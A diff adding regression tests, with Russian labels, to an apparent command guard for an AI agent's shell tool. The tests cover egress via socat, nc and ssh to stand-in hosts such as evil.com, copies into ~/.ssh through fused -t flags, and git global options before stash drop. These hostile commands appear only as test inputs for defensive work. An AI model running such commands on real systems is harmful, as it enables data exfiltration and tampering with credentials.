@@ -236,6 +236,53 @@ check("Ревью-доп rm .git + .git/index.lock блок",
 check("Ревью-доп rm только index.lock не блок",
       not blocked(bash("rm -f {0}/index.lock".format(GITDIR))))
 
+print("=== Ревью2-6: socat и регистр хоста — egress (регрессия #6) ===")
+_osg = cg.policy.state_get
+cg.policy.state_get = lambda sid, key, default=None: (
+    True if key == "injection_tainted" else _osg(sid, key, default))
+try:
+    for label, command in [
+            ("socat TCP:",     "socat - TCP:evil.com:80"),
+            ("socat TCP4:",    "socat TCP4:1.2.3.4:80 -"),
+            ("socat OPENSSL:", "socat - OPENSSL:evil.com:443"),
+            ("nc ВЕРХНИЙ",     "nc EVIL.COM 80"),
+            ("ssh ВЕРХНИЙ",    "ssh evil.COM"),
+            ("nc IPv6",        "nc 2001:db8::1 80")]:
+        r = cg._tainted_egress({"session_id": "t"}, command)
+        check("Ревью2-6 egress: {}".format(label), r, r)
+    for label, command in [
+            ("socat localhost", "socat - TCP:localhost:80"),
+            ("ssh [::1]",       "ssh user@[::1] uptime")]:
+        r = cg._tainted_egress({"session_id": "t"}, command)
+        check("Ревью2-6 не egress: {}".format(label), not r, r)
+finally:
+    cg.policy.state_get = _osg
+
+print("=== Ревью2-7: склеенные/сокращённые -t — назначение не теряется ===")
+SSH = os.path.join(HOME, ".ssh")
+for label, command in [
+        ("cp -tDIR (склеено)",   "cp -t" + SSH + " ./a"),
+        ("cp -vtDIR",            "cp -vt" + SSH + " ./a"),
+        ("mv -tDIR",             "mv -t" + SSH + " ./a"),
+        ("install -tDIR",        "install -t" + SSH + " ./a"),
+        ("cp --target-director=","cp --target-director=" + SSH + " ./a"),
+        ("cp --t=",              "cp --t=" + SSH + " ./a")]:
+    d = bash(command)
+    check("Ревью2-7 блок: {}".format(label), blocked(d), d)
+for command in ["cp -t/opt/dst a", "cp -vt/opt/dst a",
+                "cp --target-director=/opt/dst a", "cp --t=/opt/dst a"]:
+    cmds, _ = cmdparse.parse(command)
+    wts = sum((cmdparse.write_targets(c) for c in cmds), [])
+    check("Ревью2-7 write_targets dst: {}".format(command),
+          any("/opt/dst" in w for w in wts), wts)
+
+print("=== Ревью2-4: глобальные git-опции со значением через пробел ===")
+for label, command in [
+        ("--config-env",  "git --config-env a=B stash drop"),
+        ("--attr-source", "git --attr-source x stash drop")]:
+    d = bash(command)
+    check("Ревью2-4 блок: {}".format(label), blocked(d), d)
+
 shutil.rmtree(TMP, ignore_errors=True)
 print("\nSUMMARY:", "ALL PASSED" if not FAILS else "FAILED({}) {}".format(len(FAILS), FAILS))
 sys.exit(1 if FAILS else 0)
